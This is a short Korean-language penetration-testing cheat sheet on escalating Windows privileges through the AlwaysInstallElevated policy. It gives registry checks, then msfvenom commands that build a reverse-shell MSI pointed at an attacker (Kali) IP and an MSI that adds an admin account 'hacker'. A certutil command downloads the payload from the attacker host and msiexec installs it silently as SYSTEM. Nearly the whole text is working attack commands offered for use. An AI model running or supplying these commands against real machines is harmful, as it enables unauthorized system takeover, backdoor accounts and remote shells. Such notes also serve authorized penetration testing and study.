# 02_AlwaysInstallElevated

# 윈도우 권한상승 — AlwaysInstallElevated

모든 사용자가 높은 권한(SYSTEM)으로 MSI 패키지 설치 가능하도록 설정된 경우.

---

## 탐지

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**두 키 모두 `0x1` 이어야 공격 가능.**

```powershell
# PowerUp
Get-RegistryAlwaysInstallElevated
```

---

## 악성 MSI 생성

```bash
# 리버스쉘 MSI
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<칼리IP> LPORT=4444 \
  -f msi -o evil.msi

# 사용자 추가 MSI
msfvenom -p windows/adduser \
  USER=hacker PASS=P@ss123! \
  -f msi -o adduser.msi
```

---

## 설치 (SYSTEM 권한으로 실행됨)

```bash
certutil -urlcache -split -f http://<칼리IP>/evil.msi C:\Temp\evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

---

## PowerUp 자동화

```powershell
Write-UserAddMSI    # 현재 디렉터리에 evil.msi 생성
msiexec /quiet /qn /i .\evil.msi
net localgroup administrators    # hacker 계정 확인
```